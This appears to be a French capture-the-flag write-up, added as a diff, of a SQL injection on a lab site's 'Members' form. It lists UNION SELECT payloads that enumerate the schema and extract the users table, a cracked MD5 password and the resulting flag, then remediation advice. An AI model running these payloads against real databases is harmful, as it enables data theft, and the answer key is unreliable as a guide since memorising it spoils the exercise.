@@ -1,0 +1,38 @@
+📖 Définition
+
+L'**Injection SQL (SQLi)** est une technique d'injection de code où un attaquant peut exécuter des instructions SQL malveillantes qui contrôlent le serveur de base de données d'une application web. Cela permet d'accéder à des données sensibles, comme les détails des clients ou les mots de passe.
+
+📖 Approche
+
+J'ai ciblé le formulaire "Members". Après avoir confirmé la faille avec `1 OR 1=1`, j'ai cartographié la base. J'ai identifié la table `users` (`0x7573657273` en hex).
+
+Les colonnes `Commentaire` et `countersign` ont révélé un utilisateur spécifique avec :
+- Consigne : Déchiffrer ce mot de passe -> mettre en minuscule -> SHA256...
+- Hash MD5 : `5ff9d0165b4f92b14994e5c685cdce28`
+
+MD5(`5ff9d0165b4f92b14994e5c685cdce28`) -> `FortyTwo`.
+Minuscule -> `fortytwo`.
+SHA256(`fortytwo`) -> Flag.
+
+**Payloads utilisés :**
+1. Lister les tables :
+   `-1 UNION SELECT table_name, NULL FROM information_schema.tables`
+2. Lister les colonnes :
+   `-1 UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 0x7573657273`
+3. Extraire les données :
+   `-1 UNION SELECT Commentaire, countersign FROM users`
+
+**Flag :** `10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5`
+
+🛡️ Remédiation
+
+Pour corriger cela :
+- **Requêtes préparées** : Crucial pour empêcher les injections SQL.
+- **ORM** : Utiliser un ORM qui gère la construction des requêtes de manière sécurisée.
+- **WAF** : Un pare-feu applicatif web permet de détecter les attaques.
+
+🔗 Sources
+
+- [OWASP - SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
+- [CrackStation](https://crackstation.net/)
+- [SHA256 Online](https://emn178.github.io/online-tools/sha256.html)
